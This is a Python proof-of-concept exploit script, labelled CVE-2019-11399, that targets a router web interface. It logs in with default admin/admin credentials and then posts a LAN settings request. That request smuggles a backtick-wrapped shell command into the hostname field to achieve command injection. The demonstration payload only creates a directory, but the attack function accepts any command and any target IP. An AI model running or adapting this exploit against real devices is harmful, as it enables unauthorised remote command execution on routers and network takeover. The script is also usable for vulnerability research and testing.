import requests
import telnetlib
import time
import sys


def login(ip):
    # 登录
    url1 = 'http://' + ip + '/login.ccp'
    header1 = {
        'Host': ip, \
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0', \
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', \
        'Accept-Language': 'en-US,en;q=0.5', \
        'Accept-Encoding': 'gzip, deflate', \
        'Content-Type': 'application/x-www-form-urlencoded', \
        'Content-Length': '148', \
        'Origin': 'http://' + ip, \
        'Connection': 'close', \
        'Referer': 'http://' + ip + '/', \
        'Upgrade-Insecure-Requests': '1'
    }
    data1 = {
        'html_response_page': 'login_fail.htm', \
        'login_name': '', \
        'username': 'admin', \
        'password': 'admin', \
        'curr_language': '0', \
        'login_n': 'admin', \
        'login_pass': 'admin', \
        'lang_select': '0', \
        'login': 'Login'
    }
    try:
        retn = requests.post(url=url1, headers=header1, data=data1)
        print(retn.text)
        print("登陆成功!")
    except:
        print("ERROR!")
    time.sleep(1)


def attack(cmd, ip):
    login(ip)
    url2 = 'http://192.168.10.1/get_set.ccp'
    data2 = {
        'ccp_act': 'set', \
        'ccpSubEvent': 'CCP_SUB_LAN', \
        'nextPage': 'lan.htm', \
        'old_ip': '192.168.10.1', \
        'old_mask': '255.255.255.0', \
        'new_ip': '192.168.10.1',
        'new_mask': '255.255.255.0', \
        'igd_DeviceMode_1.0.0.0.0': '0', \
        'lanHostCfg_HostName_1.1.1.0.0': cmd, \
        'lanHostCfg_IPAddress_1.1.1.0.0=192.168.10.1': '192.168.10.1', \
        'lanHostCfg_SubnetMask_1.1.1.0.0': '255.255.255.0', \
        'lanHostCfg_DHCPServerEnable_1.1.1.0.0': '1',
        'lanHostCfg_MinAddress_1.1.1.0.0': '192.168.10.101', \
        'lanHostCfg_MaxAddress_1.1.1.0.0': '192.168.10.199', \
        'lanHostCfg_DomainName_1.1.1.0.0': '', \
        'lanHostCfg_DHCPLeaseTime_1.1.1.0.0': '10080', \
        'lanHostCfg_StaticDHCPEnable_1.1.1.0.0': '1'
    }
    try:
        ret = requests.post(url=url2, data=data2)
        print(ret.text)
        print("OK!")
    except:
        print("ERROR!")


if __name__ == "__main__":
    cmd = '`mkdir CVE-2019-11399`'
    ip = sys.argv[1]
    attack(cmd, ip)
